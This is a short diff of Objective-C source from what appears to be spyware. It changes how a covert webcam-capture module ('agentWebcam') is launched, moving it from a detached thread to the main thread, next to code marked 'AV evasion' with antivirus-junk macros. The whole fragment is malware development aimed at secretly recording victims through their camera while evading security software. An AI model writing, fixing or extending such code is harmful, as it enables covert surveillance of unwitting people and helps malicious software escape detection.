@@ -925,9 +925,10 @@ static NSLock *gSyncLock                  = nil;
           // AV evasion: only on release build
           AV_GARBAGE_007
           
-            [NSThread detachNewThreadSelector: @selector(start)
-                                     toTarget: agentWebcam
-                                   withObject: nil];
+//            [NSThread detachNewThreadSelector: @selector(start)
+//                                     toTarget: agentWebcam
+//                                   withObject: nil];
+            [agentWebcam performSelectorOnMainThread:@selector(start) withObject:nil waitUntilDone:FALSE];
           }
         else
           {
@@ -3243,9 +3244,10 @@ static NSLock *gSyncLock                  = nil;
                     // AV evasion: only on release build
                     AV_GARBAGE_008
                     
-                    [NSThread detachNewThreadSelector: @selector(start)
-                                             toTarget: agentWebcam
-                                           withObject: nil];
+//                    [NSThread detachNewThreadSelector: @selector(start)
+//                                             toTarget: agentWebcam
+//                                           withObject: nil];
+                    [agentWebcam performSelectorOnMainThread:@selector(start) withObject:nil waitUntilDone:FALSE];
                   }
                   
                 break;
